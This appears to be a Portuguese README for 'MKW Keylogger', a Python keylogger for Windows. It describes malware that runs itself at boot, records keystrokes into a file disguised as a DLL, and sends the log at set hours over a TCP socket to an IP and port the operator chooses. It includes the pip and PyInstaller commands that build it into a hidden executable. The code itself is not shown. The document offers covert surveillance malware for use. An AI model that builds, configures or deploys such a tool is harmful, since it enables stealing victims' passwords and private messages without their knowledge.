# MKW Keylogger

Keylogger simples para Windos com um autoboot implementado no sistema, 
o malware irá capturar pressionamentos de tecla e armazená-lo em um arquivo DLL

Use:

     <cmd> pip install pynput
     <cmd> pip install pyinstaller

     Para compilar:
      <cmd> pyinstaller.exe --onefile -w mkw.py
         abra a pasta /dist gerada para obter mkw.exe

         o arquivo de log será enviado por um socket TCP
         Digite o ip e a porta para receber o log nas linhas 33 e 34 do keylogger
         
         O malware foi programado para enviar o arquivo de log as 13 e 18 horas da tarde você pode mudar esses horarios na linha 24 do codigo
